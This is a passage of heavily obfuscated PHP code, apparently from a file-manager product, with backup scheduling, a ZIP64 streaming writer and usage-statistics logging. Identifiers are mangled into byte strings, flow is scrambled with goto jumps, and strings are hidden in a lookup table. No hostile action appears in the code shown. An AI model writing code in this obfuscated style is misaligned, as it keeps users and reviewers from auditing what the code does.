($CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[28]] == self::$name) { Model($D‹ƒ„ˆ³ò[684])->remove($CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[367]]); } $CÌ¯Ş™ŸóÃ = $this->initData($BßØÔÏ¢’¢, $CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[687]]); } else { $this->checkStore($CÌ¯Ş™ŸóÃ[$D‹ƒ„ˆ³ò[687]]); } } self::$option = $CÌ¯Ş™ŸóÃ; } private function initData($F­²¹â‚Úª = 0, $E‚È…ÚîÔ = '') { goto c‘§ØÛËÙ‡; Bï½†ÂéÚ: $this->checkStore($Eè„ìùÉÜ‚[$C¾¡‡»ÁÊ[687]]); $a·Öë†¨Ä« = array($C¾¡‡»ÁÊ[687] => $Eè„ìùÉÜ‚[$C¾¡‡»ÁÊ[687]], $C¾¡‡»ÁÊ[28] => self::$name, $C¾¡‡»ÁÊ[685] => 0, $C¾¡‡»ÁÊ[688] => $Eè„ìùÉÜ‚[$C¾¡‡»ÁÊ[688]], $C¾¡‡»ÁÊ[281] => array($C¾¡‡»ÁÊ[689] => array($C¾¡‡»ÁÊ[685] => 0), $C¾¡‡»ÁÊ[690] => array($C¾¡‡»ÁÊ[685] => 0, $C¾¡‡»ÁÊ[691] => 0, $C¾¡‡»ÁÊ[692] => 0, $C¾¡‡»ÁÊ[29] => $C¾¡‡»ÁÊ[33]), $C¾¡‡»ÁÊ[693] => array($C¾¡‡»ÁÊ[685] => 0, $C¾¡‡»ÁÊ[691] => 0, $C¾¡‡»ÁÊ[692] => 0), $C¾¡‡»ÁÊ[167] => array($C¾¡‡»ÁÊ[685] => 0, $C¾¡‡»ÁÊ[694] => 0, $C¾¡‡»ÁÊ[695] => 0, $C¾¡‡»ÁÊ[696] => 0, $C¾¡‡»ÁÊ[697] => 0, $C¾¡‡»ÁÊ[419] => $F­²¹â‚Úª)), $C¾¡‡»ÁÊ[698] => time(), $C¾¡‡»ÁÊ[699] => 0); $aôÌãöŞÎë = Model($C¾¡‡»ÁÊ[684])->insert($a·Öë†¨Ä«); goto eæÑË‡Ä·; c‘§ØÛËÙ‡: $C¾¡‡»ÁÊ =& $_SERVER[¼€¼ˆ¦‚¡]; $Eè„ìùÉÜ‚ = Model($C¾¡‡»ÁÊ[684])->config(); if ($E‚È…ÚîÔ && $Eè„ìùÉÜ‚[$C¾¡‡»ÁÊ[687]] != $E‚È…ÚîÔ) { $F­²¹â‚Úª = 0; } goto Bï½†ÂéÚ; eæÑË‡Ä·: $a·Öë†¨Ä«[$C¾¡‡»ÁÊ[367]] = $aôÌãöŞÎë; return $a·Öë†¨Ä«; goto AÓÒøÕàÃå; AÓÒøÕàÃå: } private function checkStore($A‚Ù“³©Ô®) { $Aº Íçáƒ­ =& $_SERVER[¼€¼ˆ¦‚¡]; $eëŞ„‰¯÷˜ = Model($Aº Íçáƒ­[700])->listData($A‚Ù“³©Ô®); Model($Aº Íçáƒ­[700])->checkConfig($eëŞ„‰¯÷˜); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¼€¼ˆ¦‚¡][684])->findByName(self::$name); } return self::$option; } public static function set($B™Ä¬»Ÿ·Ú) { $D†Û¡ÂÏ¹‘ =& $_SERVER[¼€¼ˆ¦‚¡]; $CÎ³á¾İç” = self::get(); foreach ($B™Ä¬»Ÿ·Ú as $f˜é®î¨›– => $a«‚†ñ –è) { $Cãè‚ãšë = explode($D†Û¡ÂÏ¹‘[91], $f˜é®î¨›–); $EÉ–ÛÀÁÀ = count($Cãè‚ãšë); switch ($EÉ–ÛÀÁÀ) { case 1: $CÎ³á¾İç”[$Cãè‚ãšë[0]] = $a«‚†ñ –è; break; case 2: $CÎ³á¾İç”[$Cãè‚ãšë[0]][$Cãè‚ãšë[1]] = $a«‚†ñ –è; break; case 3: $CÎ³á¾İç”[$Cãè‚ãšë[0]][$Cãè‚ãšë[1]][$Cãè‚ãšë[2]] = $a«‚†ñ –è; break; } } Model($D†Û¡ÂÏ¹‘[684])->update($CÎ³á¾İç”[$D†Û¡ÂÏ¹‘[367]], $CÎ³á¾İç”); self::$option = $CÎ³á¾İç”; return self::$option; } public function keep() { $a·»ÀŞö ˜ =& $_SERVER[¼€¼ˆ¦‚¡]; $e´‹ïš«¹ = self::get(); if ($e´‹ïš«¹[$a·»ÀŞö ˜[281]][$a·»ÀŞö ˜[689]][$a·»ÀŞö ˜[685]] == $a·»ÀŞö ˜[83]) { return; } $this->backupKeep($e´‹ïš«¹); self::set(array($a·»ÀŞö ˜[701] => 1)); } private function backupKeep($b¡Ê‰Œñ‚ğ) { goto fÓ¡¢š†; eĞÄÓÖîî‡: for ($AÇ¨‹êÙš = 0; $AÇ¨‹êÙš < 12; $AÇ¨‹êÙš++) { $A±†®ä›Ğ¬[] = date($fÉˆƒñÉ–[702], strtotime("\55{$AÇ¨‹êÙš}\x20\155\157\x6e\164\x68\163")); } $A±†®ä›Ğ¬ = array_unique($A±†®ä›Ğ¬); foreach ($e¦Š£¨È• as $BñÎ¦Ş­Î±) { if (!empty($BñÎ¦Ş­Î±[$fÉˆƒñÉ–[28]]) && in_array($BñÎ¦Ş­Î±[$fÉˆƒñÉ–[28]], $A±†®ä›Ğ¬)) { continue; } Model($fÉˆƒñÉ–[684])->remove($BñÎ¦Ş­Î±[$fÉˆƒñÉ–[367]]); $A²”™±ô³ = "\x7b\151\157\72{$b¡Ê‰Œñ‚ğ[$fÉˆƒñÉ–[687]]}\x7d\x2f\x64\x61\x74\x61\x62\141\163\145\x2f\142\141\x63\x6b\x75\x70\137{$BñÎ¦Ş­Î±[$fÉˆƒñÉ–[28]]}"; IO::remove($A²”™±ô³, !1); } goto eÔ‰Î²ªØ; a‚œƒÓÏª‹: $AÇ¨‹êÙš = 0; $A±†®ä›Ğ¬ = array(); foreach ($e¦Š£¨È• as $BñÎ¦Ş­Î±) { if ($AÇ¨‹êÙš >= 7) { break; } $A±†®ä›Ğ¬[] = $BñÎ¦Ş­Î±[$fÉˆƒñÉ–[28]]; $AÇ¨‹êÙš++; } goto eĞÄÓÖîî‡; fÓ¡¢š†: $fÉˆƒñÉ– =& $_SERVER[¼€¼ˆ¦‚¡]; $e¦Š£¨È• = Model($fÉˆƒñÉ–[684])->listData(); if (empty($e¦Š£¨È•)) { return; } goto a‚œƒÓÏª‹; eÔ‰Î²ªØ: } public function db() { goto BÌ„ĞØõÑ; BÌ„ĞØõÑ: $Eñ¤˜¥Í²½ =& $_SERVER[¼€¼ˆ¦‚¡]; $C–„åÂ‡ƒÄ = self::get(); if ($C–„åÂ‡ƒÄ[$Eñ¤˜¥Í²½[281]][$Eñ¤˜¥Í²½[690]][$Eñ¤˜¥Í²½[685]] == $Eñ¤˜¥Í²½[83]) { return !0; } goto e‹¹ŒœØ¬; e‹¹ŒœØ¬: $AºÓ–ôÒŒ = new BackupDb(); if (!$AºÓ–ôÒŒ->index()) { return !1; } self::set(array($Eñ¤˜¥Í²½[703] => 1)); goto FÚÖë¨é§; FÚÖë¨é§: return !0; goto b«¦Í‡­”; b«¦Í‡­”: } public function dbFile() { goto c¤÷¹˜«±Ú; ağíÏé¨‰´: $C™›È”¥íÉ = new BackupDbFile(); if (!$C™›È”¥íÉ->index()) { return !1; } self::set(array($a¨Ù±¹[704] => 1)); goto d“Ëà±; c¤÷¹˜«±Ú: $a¨Ù±¹ =& $_SERVER[¼€¼ˆ¦‚¡]; $E£öÖë´ƒñ = self::get(); if ($E£öÖë´ƒñ[$a¨Ù±¹[281]][$a¨Ù±¹[693]][$a¨Ù±¹[685]] == $a¨Ù±¹[83]) { return !0; } goto ağíÏé¨‰´; d“Ëà±: return !0; goto câù¤»¿–; câù¤»¿–: } public function file() { $Aõœ›¬»Üè =& $_SERVER[¼€¼ˆ¦‚¡]; $eôÌ’«‰í = self::get(); if ($eôÌ’«‰í[$Aõœ›¬»Üè[281]][$Aõœ›¬»Üè[167]][$Aõœ›¬»Üè[685]] == $Aõœ›¬»Üè[83]) { return !0; } if (!isset($eôÌ’«‰í[$Aõœ›¬»Üè[688]]) || $eôÌ’«‰í[$Aõœ›¬»Üè[688]] == $Aõœ›¬»Üè[468]) { $FŠœªò‰…Ö = new BackupFile(); if (!$FŠœªò‰…Ö->index()) { return !1; } } self::set(array($Aõœ›¬»Üè[705] => 1, $Aõœ›¬»Üè[685] => 1)); return !0; } } goto c¾éÁ¥‰ãÒ; c‹ÜÙãÖª: class ZipMake { const VERSION = "\x30\56\x32\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($FØ”«­³Ù = null) { $F™–¤ÍØ¤ö =& $_SERVER[¼€¼ˆ¦‚¡]; $this->outputStream = fopen($F™–¤ÍØ¤ö[2009], $F™–¤ÍØ¤ö[1226]); $this->outputName = $FØ”«­³Ù; $this->needHeaders = !0; } public function addFile($Då¬¸áæ¹, $C™¥‡çƒª¹) { goto BÌÔ¶£œ‹¥; cïèÔë›ì: while (!feof($C£®‘ø®¬)) { $C¸ß­ï²Æé = fread($C£®‘ø®¬, 1048576); $this->send($C¸ß­ï²Æé); } fclose($C£®‘ø®¬); $dŒÛâÙ†Ú = hexdec(hash_file($e¼ˆ¸—®¬¬[2011], $C™¥‡çƒª¹)); goto f×«‡çñ; BßÓ¶‘©Üò: $fˆíÁ»Ş†Ç = $this->addFileHeader($Då¬¸áæ¹, $d…à„¯ªÙÑ); $c°ˆ¡Ö‡ë = $Fš©çğ = filesize($C™¥‡çƒª¹); $C£®‘ø®¬ = fopen($C™¥‡çƒª¹, $e¼ˆ¸—®¬¬[2010]); goto cïèÔë›ì; BÌÔ¶£œ‹¥: $e¼ˆ¸—®¬¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $Då¬¸áæ¹ = $this->filterFilename($Då¬¸áæ¹); $d…à„¯ªÙÑ = static::METHOD_STORE; goto BßÓ¶‘©Üò; f×«‡çñ: $this->addFileFooter($Då¬¸áæ¹, $d…à„¯ªÙÑ, $dŒÛâÙ†Ú, $c°ˆ¡Ö‡ë, $Fš©çğ, $fˆíÁ»Ş†Ç); goto aª‹Ú“Œ•±; aª‹Ú“Œ•±: } public function addFileFromStream($a÷•äÌˆ, $c¹Ã¯‡º†ğ) { goto Dô½ÆÄ‹…; e¢‹ªÇæ‹À: $dÎø‚‡İË¿ = hash_init($_SERVER[¼€¼ˆ¦‚¡][2011]); while (!feof($c¹Ã¯‡º†ğ)) { $A‰…–Ó¦ƒò = fread($c¹Ã¯‡º†ğ, 1048576); hash_update($dÎø‚‡İË¿, $A‰…–Ó¦ƒò); $this->send($A‰…–Ó¦ƒò); } $B‘ìØ ¢·Ù = hexdec(hash_final($dÎø‚‡İË¿)); goto EÛÃèÃ´¢Å; EÛÃèÃ´¢Å: $this->addFileFooter($a÷•äÌˆ, $cÄ´œ‚‰ß†, $B‘ìØ ¢·Ù, $bëØ÷ÍŠãİ, $e›²öÙèŒî, $bêÄšïª¸÷); goto cœãƒ¤ˆˆÏ; Dô½ÆÄ‹…: $a÷•äÌˆ = $this->filterFilename($a÷•äÌˆ); $cÄ´œ‚‰ß† = static::METHOD_STORE; $bêÄšïª¸÷ = $this->addFileHeader($a÷•äÌˆ, $cÄ´œ‚‰ß†); goto Eğ„ˆÖÅ©; Eğ„ˆÖÅ©: fseek($c¹Ã¯‡º†ğ, 0, SEEK_END); $bëØ÷ÍŠãİ = $e›²öÙèŒî = ftell($c¹Ã¯‡º†ğ); rewind($c¹Ã¯‡º†ğ); goto e¢‹ªÇæ‹À; cœãƒ¤ˆˆÏ: } public function finish() { foreach ($this->files as $BñÊÏ±‚ªÜ) { $this->addCdrFile($BñÊÏ±‚ªÜ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($f¥©ØŞÄó©, $b‡æ¬åìâÈ) { goto DßêëÌƒË; BàØ‚’Î: $fˆ—áê°êÍ = $this->packFields($e¨ÂÉ»…‰Ë); $Bëš×ïìãé = $this->packFields($c²ä÷¸è«); $this->send($fˆ—áê°êÍ . $f¥©ØŞÄó© . $Bëš×ïìãé); goto E¤„Í—²ê†; E¤„Í—²ê†: return strlen($fˆ—áê°êÍ) + $B½ê‘¶§ÁŒ + strlen($Bëš×ïìãé); goto DÁµÂ…º…¢; DßêëÌƒË: $fªÇ¡èêÒâ =& $_SERVER[¼€¼ˆ¦‚¡]; $f¥©ØŞÄó© = preg_replace($fªÇ¡èêÒâ[2012], $fªÇ¡èêÒâ[33], $f¥©ØŞÄó©); $B½ê‘¶§ÁŒ = strlen($f¥©ØŞÄó©); goto C‘šåÙ»™; C‘šåÙ»™: $a×‚Ÿ­™ = $this->dosTime(time()); $e¨ÂÉ»…‰Ë = array(array($fªÇ¡èêÒâ[2013], static::FILE_HEADER_SIGNATURE), array($fªÇ¡èêÒâ[2014], static::ZIP_VERSION_64), array($fªÇ¡èêÒâ[2014], 8), array($fªÇ¡èêÒâ[2014], $b‡æ¬åìâÈ), array($fªÇ¡èêÒâ[2013], $a×‚Ÿ­™), array($fªÇ¡èêÒâ[2013], 0), array($fªÇ¡èêÒâ[2013], 4294967295), array($fªÇ¡èêÒâ[2013], 4294967295), array($fªÇ¡èêÒâ[2014], $B½ê‘¶§ÁŒ), array($fªÇ¡èêÒâ[2014], 32)); $c²ä÷¸è« = array(array($fªÇ¡èêÒâ[2014], 1), array($fªÇ¡èêÒâ[2014], 28), array($fªÇ¡èêÒâ[2015], 0), array($fªÇ¡èêÒâ[2015], 0), array($fªÇ¡èêÒâ[2015], 0), array($fªÇ¡èêÒâ[2013], 0)); goto BàØ‚’Î; DÁµÂ…º…¢: } protected function addFileFooter($b®Àğ£¬Õà, $Dö†Ò›‚È´, $AºµÛ÷‘ñ, $BÓâÀ®˜¶, $aÜ ÛêÍ—, $báŞÎÌ‘œ) { $d‰¦©©Ü†Ÿ =& $_SERVER[¼€¼ˆ¦‚¡]; $Dš¹âÙö« = array(array($d‰¦©©Ü†Ÿ[2013], static::DATA_DESCRIPTOR_SIGNATURE), array($d‰¦©©Ü†Ÿ[2013], $AºµÛ÷‘ñ), array($d‰¦©©Ü†Ÿ[2015], $BÓâÀ®˜¶), array($d‰¦©©Ü†Ÿ[2015], $aÜ ÛêÍ—)); $aáÃÂô¦Úµ = $this->packFields($Dš¹âÙö«); $this->send($aáÃÂô¦Úµ); $c‚†è¤“¾ = $báŞÎÌ‘œ + $BÓâÀ®˜¶ + $dˆïŠÚÍç; $this->addToCdr($b®Àğ£¬Õà, $Dö†Ò›‚È´, $AºµÛ÷‘ñ, $BÓâÀ®˜¶, $aÜ ÛêÍ—, $c‚†è¤“¾); } private function addToCdr($a’‚Ú„ª“°, $céˆ´ßÎ•, $AàªÄŞÖî, $A¯æ¶—ÉÔŸ, $D¡ÄÚê†ˆ, $B¨ÁÍĞ¬©µ) { $this->files[] = array($a’‚Ú„ª“°, $céˆ´ßÎ•, $AàªÄŞÖî, $A¯æ¶—ÉÔŸ, $D¡ÄÚê†ˆ, $this->ofs); $this->ofs += $B¨ÁÍĞ¬©µ; } protected function addCdrFile($c ®«¢ŞíÕ) { goto cÄ¯ö†×’‘; EÚ¦¯ïéø…: $this->send($BöĞÉÏ°Õ); $this->cdr_ofs += strlen($BöĞÉÏ°Õ); goto Få¹ñàË‡; cÄ¯ö†×’‘: $aœßğ‡íºØ =& $_SERVER[¼€¼ˆ¦‚¡]; list($D†Æ‰î‡ˆ, $CªŠ±•œ°Æ, $CÖ˜•çÉë®, $D­¡¹ëëÖ, $e©í°Á¸ˆƒ, $FÄ‡Èˆ°À) = $c ®«¢ŞíÕ; $EŸÙÒò‹ = $aœßğ‡íºØ[33]; goto AÉ†ÒÀ‘¼«; aã‚Óá„·: $d¹Œ½Òœª = $this->packFields($aÅĞùÊÜÕâ); $dçÄæÏ±æó = $this->packFields($aƒè ¶¢äÅ); $BöĞÉÏ°Õ = $d¹Œ½Òœª . $D†Æ‰î‡ˆ . $EŸÙÒò‹ . $dçÄæÏ±æó; goto EÚ¦¯ïéø…; AÉ†ÒÀ‘¼«: $aÒáª¼´¬Á = $this->dosTime(time()); $aÅĞùÊÜÕâ = array(array($aœßğ‡íºØ[2013], static::CDR_FILE_SIGNATURE), array($aœßğ‡íºØ[2014], static::ZIP_VERSION_64), array($aœßğ‡íºØ[2014], static::ZIP_VERSION_64), array($aœßğ‡íºØ[2014], 8), array($aœßğ‡íºØ[2014], $CªŠ±•œ°Æ), array($aœßğ‡íºØ[2013], $aÒáª¼´¬Á), array($aœßğ‡íºØ[2013], $CÖ˜•çÉë®), array($aœßğ‡íºØ[2013], 4294967295), array($aœßğ‡íºØ[2013], 4294967295), array($aœßğ‡íºØ[2014], strlen($D†Æ‰î‡ˆ)), array($aœßğ‡íºØ[2014], 32), array($aœßğ‡íºØ[2014], strlen($EŸÙÒò‹)), array($aœßğ‡íºØ[2014], 0), array($aœßğ‡íºØ[2014], 0), array($aœßğ‡íºØ[2013], 32), array($aœßğ‡íºØ[2013], 4294967295)); $aƒè ¶¢äÅ = array(array($aœßğ‡íºØ[2014], 1), array($aœßğ‡íºØ[2014], 28), array($aœßğ‡íºØ[2015], $e©í°Á¸ˆƒ), array($aœßğ‡íºØ[2015], $D­¡¹ëëÖ), array($aœßğ‡íºØ[2015], $FÄ‡Èˆ°À), array($aœßğ‡íºØ[2013], 0)); goto aã‚Óá„·; Få¹ñàË‡: } protected function addCdr64Eof() { goto dìØ‡ƒøŸå; cìË—èÖÃ: $this->send($f°™Á±¸šÅ); goto F‰Ú–ä”¢; fÒÍ†ñ…’Ì: $Fô„ÏŞÇà = $this->ofs; $fˆØ½›õ‹Ÿ = array(array($fÚìµ¬¦“ƒ[2013], static::ZIP64_CDR_EOF_SIGNATURE), array($fÚìµ¬¦“ƒ[2015], 44), array($fÚìµ¬¦“ƒ[2014], static::ZIP_VERSION_64), array($fÚìµ¬¦“ƒ[2014], static::ZIP_VERSION_64), array($fÚìµ¬¦“ƒ[2013], 0), array($fÚìµ¬¦“ƒ[2013], 0), array($fÚìµ¬¦“ƒ[2015], $d¨’éÈõº), array($fÚìµ¬¦“ƒ[2015], $d¨’éÈõº), array($fÚìµ¬¦“ƒ[2015], $e¾±‡âº¶¶), array($fÚìµ¬¦“ƒ[2015], $Fô„ÏŞÇà)); $f°™Á±¸šÅ = $this->packFields($fˆØ½›õ‹Ÿ); goto cìË—èÖÃ; dìØ‡ƒøŸå: $fÚìµ¬¦“ƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $d¨’éÈõº = count($this->files); $e¾±‡âº¶¶ = $this->cdr_ofs; goto fÒÍ†ñ…’Ì; F‰Ú–ä”¢: } protected function addCdr64Locator() { goto cÂ‰Š…µÜ; CÃ×³Úëèæ: $eÂÒµ™©¦³ = $this->ofs; $e¤Ü¥‰–Ğø = array(array($b³ëÂªÑÎ³[2013], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($b³ëÂªÑÎ³[2013], 0), array($b³ëÂªÑÎ³[2015], $eÂÒµ™©¦³ + $c¦†„øŠ£), array($b³ëÂªÑÎ³[2013], 1)); $C‚ÚË÷¬‹ = $this->packFields($e¤Ü¥‰–Ğø); goto a˜¸Åºè·Ğ; a˜¸Åºè·Ğ: $this->send($C‚ÚË÷¬‹); goto e‹—‚­êŸá; cÂ‰Š…µÜ: $b³ëÂªÑÎ³ =& $_SERVER[¼€¼ˆ¦‚¡]; $e‡ëä¸ñé” = count($this->files); $c¦†„øŠ£ = $this->cdr_ofs; goto CÃ×³Úëèæ; e‹—‚­êŸá: } protected function addCdrEof() { goto dÆ§¹‘¿‡‰; f†Ò‹¿½•£: $c×©Õ„™¨Æ = $this->packFields($Fõ‘ÔƒÍ˜›) . $b÷±‚ÙÆ½; $this->send($c×©Õ„™¨Æ); goto fÕˆ­¹ËÒ·; dÆ§¹‘¿‡‰: $AÃÆ”ïò¾ =& $_SERVER[¼€¼ˆ¦‚¡]; $FÛ«îø•× = count($this->files); $AÃœ±¡†‹õ = $this->cdr_ofs; goto eƒÕÀ‘›ƒÁ; eƒÕÀ‘›ƒÁ: $D¾ìÓ¿…æ» = $this->ofs; $b÷±‚ÙÆ½ = $AÃÆ”ïò¾[33]; $Fõ‘ÔƒÍ˜› = array(array($AÃÆ”ïò¾[2013], static::CDR_EOF_SIGNATURE), array($AÃÆ”ïò¾[2014], 0), array($AÃÆ”ïò¾[2014], 0), array($AÃÆ”ïò¾[2014], $FÛ«îø•×), array($AÃÆ”ïò¾[2014], $FÛ«îø•×), array($AÃÆ”ïò¾[2013], 4294967295), array($AÃÆ”ïò¾[2013], 4294967295), array($AÃÆ”ïò¾[2014], strlen($b÷±‚ÙÆ½))); goto f†Ò‹¿½•£; fÕˆ­¹ËÒ·: } protected function addCdr() { foreach ($this->files as $f»¢ôïğöš) { $this->addCdrFile($f»¢ôïğöš); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $CŠ¥÷®ƒÏÈ =& $_SERVER[¼€¼ˆ¦‚¡]; $bõÙÒÔ¼Ä– = $CŠ¥÷®ƒÏÈ[202]; if ($this->outputName) { $cÄğíŸ´ƒ· = trim(str_replace(array($CŠ¥÷®ƒÏÈ[113], $CŠ¥÷®ƒÏÈ[55], $CŠ¥÷®ƒÏÈ[93], $CŠ¥÷®ƒÏÈ[67], $CŠ¥÷®ƒÏÈ[217], $CŠ¥÷®ƒÏÈ[991]), $CŠ¥÷®ƒÏÈ[33], $this->outputName)); $BÃ½ïî…¼´ = rawurlencode($cÄğíŸ´ƒ·); $bõÙÒÔ¼Ä– .= "\x3b\x20\x66\x69\x6c\145\x6e\141\155\145\52\x3d\x75\164\146\55\x38\47\47{$BÃ½ïî…¼´}"; } $b“°ãºĞò = array($CŠ¥÷®ƒÏÈ[199] => $CŠ¥÷®ƒÏÈ[2016], $CŠ¥÷®ƒÏÈ[2017] => $bõÙÒÔ¼Ä–, $CŠ¥÷®ƒÏÈ[2018] => $CŠ¥÷®ƒÏÈ[2019], $CŠ¥÷®ƒÏÈ[2020] => $CŠ¥÷®ƒÏÈ[2021], $CŠ¥÷®ƒÏÈ[2022] => $CŠ¥÷®ƒÏÈ[2023]); foreach ($b“°ãºĞò as $d¶øîè­± => $bæéàï¦àò) { header($d¶øîè­± . $CŠ¥÷®ƒÏÈ[879] . $bæéàï¦àò); } } protected function send($Cèèæâ·åï) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $Cèèæâ·åï); } protected final function dosTime($aë¦‚«–¥¦) { $Fß­«–šöè =& $_SERVER[¼€¼ˆ¦‚¡]; $bĞ¤ãóîƒ = getdate($aë¦‚«–¥¦); if ($bĞ¤ãóîƒ[$Fß­«–šöè[1726]] < 1980) { $bĞ¤ãóîƒ = array($Fß­«–šöè[1726] => 1980, $Fß­«–šöè[2024] => 1, $Fß­«–šöè[2025] => 1, $Fß­«–šöè[2026] => 0, $Fß­«–šöè[2027] => 0, $Fß­«–šöè[2028] => 0); } $bĞ¤ãóîƒ[$Fß­«–šöè[1726]] -= 1980; return $bĞ¤ãóîƒ[$Fß­«–šöè[1726]] << 25 | $bĞ¤ãóîƒ[$Fß­«–šöè[2024]] << 21 | $bĞ¤ãóîƒ[$Fß­«–šöè[2025]] << 16 | $bĞ¤ãóîƒ[$Fß­«–šöè[2026]] << 11 | $bĞ¤ãóîƒ[$Fß­«–šöè[2027]] << 5 | $bĞ¤ãóîƒ[$Fß­«–šöè[2028]] >> 1; } protected function packFields($dÂßëÅ´‰¼) { $dŒ˜‰Ÿê¦† =& $_SERVER[¼€¼ˆ¦‚¡]; $d‘¸„È×ëÇ = $dŒ˜‰Ÿê¦†[33]; $C±ŒßÑ”ù‡ = array(); foreach ($dÂßëÅ´‰¼ as $b ·¦Õï±ï) { $d‘¸„È×ëÇ .= $b ·¦Õï±ï[0]; $C±ŒßÑ”ù‡[] = $b ·¦Õï±ï[1]; } array_unshift($C±ŒßÑ”ù‡, $d‘¸„È×ëÇ); return call_user_func_array($dŒ˜‰Ÿê¦†[2029], $C±ŒßÑ”ù‡); } protected function filterFilename($AĞÃ§¸âÅŠ) { $AÛîéÑ¡º„ =& $_SERVER[¼€¼ˆ¦‚¡]; return str_replace(array($AÛîéÑ¡º„[93], $AÛîéÑ¡º„[4], $AÛîéÑ¡º„[176], $AÛîéÑ¡º„[69], $AÛîéÑ¡º„[113], $AÛîéÑ¡º„[924], $AÛîéÑ¡º„[927], $AÛîéÑ¡º„[271]), $AÛîéÑ¡º„[70], $AĞÃ§¸âÅŠ); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($C’ñã‚¨Õ) { $aÖæø—ìˆæ =& $_SERVER[¼€¼ˆ¦‚¡]; $f‚íğÂªåå = array($aÖæø—ìˆæ[535] => array($aÖæø—ìˆæ[29] => $aÖæø—ìˆæ[2030], $aÖæø—ìˆæ[261] => array($aÖæø—ìˆæ[210], $aÖæø—ìˆæ[696], $aÖæø—ìˆæ[2031], $aÖæø—ìˆæ[2032])), $aÖæø—ìˆæ[2033] => array($aÖæø—ìˆæ[29] => $aÖæø—ìˆæ[2034], $aÖæø—ìˆæ[261] => array($aÖæø—ìˆæ[210], $aÖæø—ìˆæ[694], $aÖæø—ìˆæ[2035], $aÖæø—ìˆæ[2036], $aÖæø—ìˆæ[2037]))); if (!isset($f‚íğÂªåå[$C’ñã‚¨Õ])) { return !1; } $this->optionType = $f‚íğÂªåå[$C’ñã‚¨Õ][$aÖæø—ìˆæ[29]]; $this->field = $f‚íğÂªåå[$C’ñã‚¨Õ][$aÖæø—ìˆæ[261]]; return !0; } public function listData($b§Š„ùÚ = false, $c…áŒƒàºÏ = "\155\x6f\x64\x69\x66\171\124\x69\x6d\x65", $D¯…¤éá ¿ = false) { return parent::listData($b§Š„ùÚ, $c…áŒƒàºÏ, $D¯…¤éá ¿); } public function trendList($eâèå’ªÕ÷) { goto Fä¢á±¹Ÿ; E¸ö‘¨ßé‡: if (!isset($bÇí”®µï‚)) { $aŒçò¶®ÉÍ = $eâèå’ªÕ÷ == $D›’†£ãÍô[535] ? $D›’†£ãÍô[477] : $D›’†£ãÍô[749]; $bÇí”®µï‚ = Model($aŒçò¶®ÉÍ)->min($D›’†£ãÍô[187]); } $BõÜ˜Ğœì = $D›’†£ãÍô[2040] . ucfirst($eâèå’ªÕ÷); $fÉí±›ç¡á = $this->dateList($bÇí”®µï‚); goto Aä¾æÁ·Ú›; Aä¾æÁ·Ú›: foreach ($fÉí±›ç¡á as $aÕĞÅ×¾·Á) { $this->{$BõÜ˜Ğœì}($aÕĞÅ×¾·Á); } return $this->listData(); goto e‘ŠÚØôø‰; Fä¢á±¹Ÿ: $D›’†£ãÍô =& $_SERVER[¼€¼ˆ¦‚¡]; $C®¿–×½ = $this->listData(); if ($C®¿–×½) { $FíÀ‚Ñáƒ’ = end($C®¿–×½); $aÕĞÅ×¾·Á = date($D›’†£ãÍô[2038], strtotime($D›’†£ãÍô[2039])); if ($FíÀ‚Ñáƒ’[$D›’†£ãÍô[210]] == $aÕĞÅ×¾·Á) { return $C®¿–×½; } $bÇí”®µï‚ = strtotime($FíÀ‚Ñáƒ’[$D›’†£ãÍô[210]]); } goto E¸ö‘¨ßé‡; e‘ŠÚØôø‰: } private function dateList($Eº–Ó¿¹ÄŒ) { $b³Î¬İİ =& $_SERVER[¼€¼ˆ¦‚¡]; $EëÚ‡î‹ê = $Eº–Ó¿¹ÄŒ; $BİŞ‚·†Œ = strtotime($b³Î¬İİ[2039]); $bùË’¾µ· = array(); while ($EëÚ‡î‹ê <= $BİŞ‚·†Œ) { $bùË’¾µ·[] = date($b³Î¬İİ[2038], $EëÚ‡î‹ê); $EëÚ‡î‹ê = strtotime($b³Î¬İİ[2041], $EëÚ‡î‹ê); } return $bùË’¾µ·; } public function _recordUser($FÖœ„Ÿ¦Å = '') { goto bÎ¤Ë±§–«; eÅ¤“¯Èƒ¢: $dÛÂÆ…Ä‰¬ = array($AÓƒ¼†”ãõ[210] => $FÖœ„Ÿ¦Å, $AÓƒ¼†”ãõ[696] => (int) $FŸ¦·»Ü ¸, $AÓƒ¼†”ãõ[2031] => (int) $CÊ©÷«Îî‘, $AÓƒ¼†”ãõ[2032] => (int) $fæŞ‡íÈÚ ); return $this->insert($dÛÂÆ…Ä‰¬); goto D­‚öÈÁ¥; bÎ¤Ë±§–«: $AÓƒ¼†”ãõ =& $_SERVER[¼€¼ˆ¦‚¡]; $C…–åê• = strtotime(date($AÓƒ¼†”ãõ[2042], strtotime($FÖœ„Ÿ¦Å))); $bÒø³È‡ó = strtotime(date($AÓƒ¼†”ãõ[2043], strtotime($FÖœ„Ÿ¦Å))); goto bÑ‚îèİ; dªøŒ›ƒìº: $CÊ©÷«Îî‘ = Model($AÓƒ¼†”ãõ[477])->where($Aê­ÆôÁÒ)->count($AÓƒ¼†”ãõ[1437]); $Aê­ÆôÁÒ[$AÓƒ¼†”ãõ[29]] = $AÓƒ¼†”ãõ[2044]; $fæŞ‡íÈÚ  = Model($AÓƒ¼†”ãõ[2045])->where($Aê­ÆôÁÒ)->count($AÓƒ¼†”ãõ[2046]); goto eÅ¤“¯Èƒ¢; 